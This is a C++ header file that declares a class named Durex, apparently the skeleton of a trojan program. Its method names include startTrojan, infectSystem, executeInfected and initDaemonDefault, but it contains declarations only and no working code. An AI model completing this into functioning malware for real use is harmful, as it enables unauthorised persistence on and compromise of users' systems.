#ifndef DUREX_HPP
# define DUREX_HPP

#include "all.hpp"
#include "Environment.hpp"
#include "Service.hpp"
#include "Utils.hpp"
#include "Server.hpp"
class Durex
{
	public:

		Durex( char **env);
		Durex( Durex const & src );
		virtual ~Durex( void );

		Durex &								operator=( Durex const & rhs );
		friend std::ostream &				operator<<(std::ostream & o, Durex const & i);
		bool 				isInSystemBinaryPath();
		void 				startTrojan();
		void				infectSystem();
		int					getRandom(int low, int high);
		void				executeInfected(std::string path);
		std::string			getDurexContent();
		void				initDaemonDefault();
		static void				handleSignal(int sig);
	private:
		Environment *env;
};

#endif
